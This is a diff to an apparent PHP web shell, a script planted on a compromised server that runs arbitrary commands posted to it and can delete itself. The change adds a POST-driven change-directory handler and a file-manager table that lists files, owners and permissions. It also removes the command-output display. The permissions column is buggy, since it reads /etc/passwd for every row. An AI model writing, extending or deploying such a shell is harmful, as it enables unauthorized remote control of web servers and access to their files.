@@ -64,6 +64,12 @@ if (isset($_POST["exec"]))
 		$result = $e;
 	}
 }
+
+if (isset($_POST["dir"]))
+{
+	$dir = $_POST["dir"];
+
+	if (is_dir($dir)) { chdir($dir); }
 }
 
 if (isset($_POST["kill"])) { unlink(__FILE__); }
@@ -211,24 +217,96 @@ if (isset($result))
 	<b>Warning!</b> You'll forever lose access to the shell. This action can't be undone.
 </form>
 
+<h1>File Manager</h1>
+
 <?php
-if (isset($_POST["exec"]))
+$cwd = getcwd();
+
+if ($cwd)
 {
-	$command = $_POST["exec"];
-
-	$output = null;
-	$result_code = null;
-
-	$result = exec($command, $output, $result_code);
+	$files = scandir($cwd);
 
 	?>
-<pre name="terminal">
-<?
-echo(($result == FALSE) ? "Command not found..." : implode("\n", $output));
-?>
-</pre>
-	<?
+	<table>
+		<tr>
+			<th>Name</th>
+			<th>Size</th>
+			<th>Creation Date</th>
+			<th>Last Modified</th>
+			<th>Owner / Group</th>
+			<th>Permissions</th>
+		</tr>
+		<?php
+		foreach ($files as &$f)
+		{
+			$perms = fileperms('/etc/passwd');
+
+			switch ($perms & 0xF000) {
+					case 0xC000:
+							$info = 's';
+							break;
+					case 0xA000:
+							$info = 'l';
+							break;
+					case 0x8000:
+							$info = 'r';
+							break;
+					case 0x6000:
+							$info = 'b';
+							break;
+					case 0x4000:
+							$info = 'd';
+							break;
+					case 0x2000:
+							$info = 'c';
+							break;
+					case 0x1000:
+							$info = 'p';
+							break;
+					default:
+							$info = 'u';
+			}
+
+			$info .= " | ";
+			$info .= (($perms & 0x0100) ? 'r' : '-');
+			$info .= (($perms & 0x0080) ? 'w' : '-');
+			$info .= (($perms & 0x0040) ?
+									(($perms & 0x0800) ? 's' : 'x' ) :
+									(($perms & 0x0800) ? 'S' : '-'));
+
+			$info .= (($perms & 0x0020) ? 'r' : '-');
+			$info .= (($perms & 0x0010) ? 'w' : '-');
+			$info .= (($perms & 0x0008) ?
+									(($perms & 0x0400) ? 's' : 'x' ) :
+									(($perms & 0x0400) ? 'S' : '-'));
+
+			$info .= (($perms & 0x0004) ? 'r' : '-');
+			$info .= (($perms & 0x0002) ? 'w' : '-');
+			$info .= (($perms & 0x0001) ?
+									(($perms & 0x0200) ? 't' : 'x' ) :
+									(($perms & 0x0200) ? 'T' : '-'));
+
+			echo( sprintf("<tr><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s / %s</td><td>%s</td></tr>",
+				$f,
+				is_file($f) ? filesize($f) : "dir", 
+				date(DATE_RFC2822, filectime($f)),
+				date(DATE_RFC2822, filemtime($f)),
+				sprintf("%s ( %s )", posix_getuid(), posix_getpwuid(fileowner($f))["name"]),
+				sprintf("%s ( %s )", posix_getgid(), posix_getgrgid(filegroup($f))["name"]),
+				$info
+				) 
+			);
+		}
+		?>
+	</table>
+	<?php
 }
 ?>
+
+<form action="<? echo($shell); ?>" method="POST">
+	<label for="dir">Change Directory:</label>
+	<input type="text" id="dir" name="dir" placeholder="..">
+	<input type="submit" value="Change Directory">
+</form>
 
 </body></html>
